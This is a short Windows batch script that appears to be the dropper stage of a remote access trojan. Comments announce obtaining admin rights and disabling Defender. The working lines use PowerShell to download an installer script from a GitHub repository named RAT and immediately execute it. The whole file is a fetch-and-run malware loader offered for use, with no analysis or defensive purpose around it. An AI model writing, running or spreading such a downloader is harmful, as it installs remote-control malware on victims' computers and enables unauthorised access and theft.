REM get admin permissions for script
@echo off

REM disable defender
start

REM rat ressources

powershell powershell.exe "Invoke-WebRequest -Uri https://raw.githubusercontent.com/riahifiras/RAT/main/files/installer.ps1 -OutFile installer.ps1"
powershell "./installer.ps1"